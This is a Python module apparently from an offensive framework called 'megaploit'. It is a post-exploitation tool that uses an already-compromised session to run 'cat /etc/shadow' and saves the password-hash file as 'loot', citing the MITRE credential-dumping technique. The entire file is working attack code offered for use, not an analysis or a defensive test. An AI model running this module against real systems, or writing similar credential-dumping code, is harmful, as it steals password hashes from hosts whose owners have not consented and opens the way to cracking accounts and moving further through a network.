"""megaploit.modules.post.linux.gather.dump_shadow — read /etc/shadow (needs root)."""
from megaploit.modules.base import AgentModule, ModuleType, OptionType

class PostDumpShadow(AgentModule):
    name        = "post/linux/gather/dump_shadow"
    description = "Read /etc/shadow and store as loot (requires root)"
    module_type = ModuleType.POST
    author      = "megaploit"
    references  = [
        "https://attack.mitre.org/techniques/T1003/008/",
    ]
    platform    = ["linux"]; arch = []; rank = 400

    def _define_options(self) -> None:
        self._opt("SESSION",    OptionType.INTEGER, required=True,
                  description="Session ID to target")
        self._opt("SHADOW_PATH", OptionType.STRING, default="/etc/shadow",
                  required=False, description="Path to shadow file")

    def run(self, session=None) -> list:
        self.validate()
        sess = session or self.session
        if sess is None:
            from megaploit.modules.base import ModuleError
            raise ModuleError("No session — set SESSION <id>")
        self.results.clear()
        path = str(self.get("SHADOW_PATH"))
        self._emit(f"[*] Reading {path}…")
        out = self._send(f"cat {path}", sess)
        if "Permission denied" in out or "cannot open" in out.lower():
            self._fail("Permission denied — needs root/sudo", path=path)
        elif out.strip():
            self._ok(f"{path} retrieved ({len(out.splitlines())} entries)",
                     path=path, data=out)
        else:
            self._fail("Empty output from shadow file", path=path)
        return self.results

MODULE = PostDumpShadow
